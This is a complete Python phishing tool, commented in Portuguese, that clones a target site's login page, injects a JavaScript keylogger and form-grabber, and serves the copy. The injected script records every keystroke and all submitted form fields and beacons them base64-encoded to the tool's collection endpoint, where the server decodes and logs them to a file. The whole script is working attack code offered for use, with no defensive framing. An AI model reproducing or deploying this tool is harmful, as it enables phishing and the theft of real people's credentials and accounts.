#!/usr/bin/env python3
"""Clone de página de login + keylogger + coletor de credenciais."""
import argparse, base64, os, re, ssl, threading
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import urljoin, parse_qs
import requests

LOGFILE = "log.txt"

KEYLOGGER_JS = r"""
<script>
(function() {
    var buffer = [];
    document.addEventListener('keydown', function(e) {
        var t = e.key;
        if (t === 'Enter') t = '[ENTER]';
        else if (t === 'Tab') t = '[TAB]';
        else if (t === 'Backspace') t = '[BS]';
        buffer.push(t.length === 1 ? t : '[' + t + ']');
    });
    // Captura credenciais no submit do formulario
    document.addEventListener('submit', function(e) {
        var dados = {};
        e.target.querySelectorAll('input, select, textarea').forEach(function(i) {
            if (i.name || i.id) dados[i.name || i.id] = i.value;
        });
        if (Object.keys(dados).length) {
            navigator.sendBeacon('/coletar', 'creds=' + btoa(JSON.stringify(dados)));
        }
    }, true);
    setInterval(function() {
        if (buffer.length) {
            navigator.sendBeacon('/coletar', 'teclas=' + btoa(buffer.join('')));
            buffer = [];
        }
    }, 3000);
})();
</script>
"""

# ---------- CLONAGEM ----------
def clonar(url_alvo, pasta):
    os.makedirs(pasta, exist_ok=True)
    s = requests.Session()
    s.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36"})
    print(f"[*] Baixando {url_alvo} ...")
    resp = s.get(url_alvo, timeout=20, verify=False)
    html = resp.text

    # Transforma caminhos relativos em absolutos (para assets do alvo continuarem carregando)
    html = re.sub(
        r'(src|href|action)=(["\'])(?!https?://|//|data:|javascript:|#)([^"\']+)',
        lambda m: f'{m.group(1)}={m.group(2)}{urljoin(url_alvo, m.group(3))}{m.group(2)}',
        html
    )

    # Injeta o keylogger antes de </body>
    if '</body>' in html.lower():
        html = re.sub(r'(?i)</body>', KEYLOGGER_JS + '\n</body>', html, count=1)
    else:
        html += KEYLOGGER_JS

    caminho = os.path.join(pasta, 'index.html')
    with open(caminho, 'w', encoding='utf-8') as f:
        f.write(html)
    print(f"[+] Clone salvo em {caminho} com keylogger injetado")

# ---------- SERVIDOR + COLETA ----------
class Handler(BaseHTTPRequestHandler):
    def _log(self):
        with open(LOGFILE, 'a', encoding='utf-8') as f:
            f.write(f"[{self.client_address[0]}] {self.path}\n")

    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(length).decode('utf-8', errors='ignore')
        dados = parse_qs(body)
        with open(LOGFILE, 'a', encoding='utf-8') as f:
            f.write(f"[{self.client_address[0]}] {dados}\n")
        for campo, valor in dados.items():
            try:
                decodificado = base64.b64decode(valor[0]).decode('utf-8', errors='ignore')
                print(f"\n[+] {campo.upper()} -> {decodificado}", flush=True)
                with open(LOGFILE, 'a', encoding='utf-8') as f:
                    f.write(f"[{campo}] {decodificado}\n")
            except Exception:
                pass
        self.send_response(200)
        self.end_headers()
        self._log()

    def do_GET(self):
        if self.path in ('/', '/index.html'):
            arquivo = os.path.join('clone', 'index.html')
        else:
            arquivo = os.path.join('clone', self.path.lstrip('/'))
        if os.path.isfile(arquivo):
            with open(arquivo, 'rb') as f:
                self.send_response(200)
                self.send_header('Content-Type', 'text/html; charset=utf-8')
                self.end_headers()
                self.wfile.write(f.read())
        else:
            self.send_error(404)

    def log_message(self, fmt, *args):
        pass  # silencia log padrao

# ---------- MAIN ----------
if __name__ == '__main__':
    ap = argparse.ArgumentParser(description='Clone + keylogger')
    ap.add_argument('url', help='URL do login a clonar (ex: https://exemplo.com/login)')
    ap.add_argument('--porta', type=int, default=8080)
    ap.add_argument('--cert', help='cert.pem para HTTPS')
    ap.add_argument('--key', help='key.pem para HTTPS')
    args = ap.parse_args()

    clonar(args.url, 'clone')

    servidor = ThreadingHTTPServer(('0.0.0.0', args.porta), Handler)
    if args.cert and args.key:
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ctx.load_cert_chain(args.cert, args.key)
        servidor.socket = ctx.wrap_socket(servidor.socket, server_side=True)
        print(f"[+] Servindo HTTPS em https://0.0.0.0:{args.porta}")
    else:
        print(f"[+] Servindo HTTP em http://0.0.0.0:{args.porta}")
    print(f"[+] Teclas e credenciais -> {LOGFILE}")
    servidor.serve_forever()